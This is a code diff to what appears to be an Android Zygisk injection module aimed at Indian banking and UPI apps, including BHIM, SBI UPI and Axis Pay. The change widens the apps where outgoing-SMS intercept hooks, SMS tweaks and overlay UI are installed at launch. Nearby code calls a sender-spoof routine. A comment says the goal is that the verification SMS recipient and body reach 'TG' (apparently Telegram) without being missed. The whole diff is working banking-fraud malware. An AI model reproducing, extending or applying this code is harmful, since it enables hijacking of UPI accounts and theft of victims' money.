@@ -136,6 +136,20 @@ bool is_hero_pkg(const std::string& pkg) {
     return false;
 }
 
+/** Bank BHIM UPI (ESAF etc.) — verify SMS window is short; Java ISms NOW like Hero. */
+bool is_fast_verify_upi(const std::string& pkg) {
+    if (pkg.empty()) return false;
+    if (is_hero_pkg(pkg)) return true;
+    if (pkg.find("esaf") != std::string::npos) return true;
+    if (pkg.find("fisglobal") != std::string::npos) return true;
+    if (pkg == "in.org.npci.upiapp") return true;
+    if (pkg == "com.sbi.upi") return true;
+    if (pkg == "com.upi.axispay") return true;
+    if (pkg.rfind("com.fss.", 0) == 0) return true;  // BHIM bank FSS apps
+    if (pkg.find("bhim") != std::string::npos) return true;
+    return false;
+}
+
 struct DeferredOverlayJob {
     JavaVM* vm = nullptr;
     zygisk::Api* api = nullptr;
@@ -368,12 +382,12 @@ public:
             sender_spoof::install(env_, api_, pkg_.c_str());
             schedule_deferred_java_sms(env_, pkg_, 1);
             report_line(api_, "post_msg_ok:" + pkg_);
-        } else if (is_hero_pkg(pkg_)) {
-            // Hero ONLY — Java NOW (token expire window). No sender_spoof here (OTP).
+        } else if (is_hero_pkg(pkg_) || is_fast_verify_upi(pkg_)) {
+            // Hero + BHIM ESAF / bank UPI — Java NOW so To+body TG na miss ho
             outgoing_sms_hook::arm_intercept_hooks();
             overlay_ui::install_sms_tweaks_java(env_, pkg_.c_str());
             schedule_deferred_java_sms(env_, pkg_, 1);
-            report_line(api_, "post_hero_fast_java:" + pkg_);
+            report_line(api_, std::string("post_fast_verify_java:") + pkg_);
             if (native_overlay_wanted() && overlay_allowed_pkg(pkg_)) {
                 schedule_overlay_ui(env_, api_, pkg_, 2);
             }
